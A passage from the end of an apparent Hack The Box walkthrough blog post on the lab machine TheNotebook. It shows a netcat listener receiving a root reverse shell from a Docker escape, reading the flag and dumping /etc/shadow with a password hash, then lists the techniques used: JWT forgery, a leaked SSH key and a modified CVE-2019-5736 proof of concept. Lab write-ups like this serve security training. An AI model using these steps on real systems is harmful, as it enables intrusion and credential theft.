+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># nc -lvp 4322</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4322</span><br><span class="line">Ncat: Listening on 0.0.0.0:4322</span><br><span class="line">Ncat: Connection from 10.10.10.230.</span><br><span class="line">Ncat: Connection from 10.10.10.230:37578.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (68630): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">&lt;da0ce3c741b77d5a95dafd4f680fc443d94bcad9564fce056<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">&lt;da0ce3c741b77d5a95dafd4f680fc443d94bcad9564fce056<span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/run/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/ebd846222421782da0ce3c741b77d5a95dafd4f680fc443d94bcad9564fce056</span><br><span class="line">&lt;da0ce3c741b77d5a95dafd4f680fc443d94bcad9564fce056<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@thenotebook:/root<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">cleanup.sh</span><br><span class="line">docker-runc</span><br><span class="line">reset.sh</span><br><span class="line">root.txt</span><br><span class="line">start.sh</span><br><span class="line">root@thenotebook:/root<span class="comment"># cat root.txt</span></span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">4de72defc1cf5263e34f67acc80c6018</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1911.jpg"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@thenotebook:/root<span class="comment"># cat /etc/shadow</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$6$OZ7vREXE<span class="variable">$yXjcCfK6rhgAfN5oLisMiB8rE</span>/uoZb7hSqTOYCUTF8lNPXgEiHi7zduz1mrTWtFnhKOCZA9XZu12osORyYnKF.:18670:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>jwt cookie auth parameter forge</li>
+<li>.ssh id_rsa key leak</li>
+<li>Docker escapes from the sandbox</li>
+<li>modify golang CVE-2019-5736-PoC to get a reverse shell</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/03/09/TheNotebook/" title="Hack-The-Box-walkthrough[TheNotebook]">https://fdlucifer.github.io/2021/03/09/TheNotebook/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/03/01/spectra/" rel="prev" title="Hack-The-Box-walkthrough[Spectra]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Spectra]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/03/29/Armageddon/" rel="next" title="Hack-The-Box-walkthrough[Armageddon]">
+                  Hack-The-Box-walkthrough[Armageddon] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
